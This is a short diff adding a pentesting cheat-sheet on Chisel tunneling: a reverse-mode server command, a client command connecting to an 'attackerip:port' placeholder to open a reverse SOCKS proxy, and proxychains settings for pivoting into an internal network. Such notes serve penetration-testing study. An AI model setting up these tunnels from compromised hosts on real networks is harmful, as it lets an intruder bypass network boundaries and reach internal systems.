@@ -1,0 +1,23 @@
+Chisel Tunneling:
+=================
+
+Chisel Server:
+---------------
+
+chisel server -p 1337 --reverse
+
+Chisel Client:
+---------------
+
+chisel client attackerip:port R:socks
+
+Note: Now edit your proxychains4.conf file with following details.
+
+====================
+comment socks4 line
+socks5 127.0.0.1 1080
+=====================
+
+Before running any command now use proxychains command to use the chisel tunneling.
+
+eg:- proxychains ping -c1 192.168.0.10 
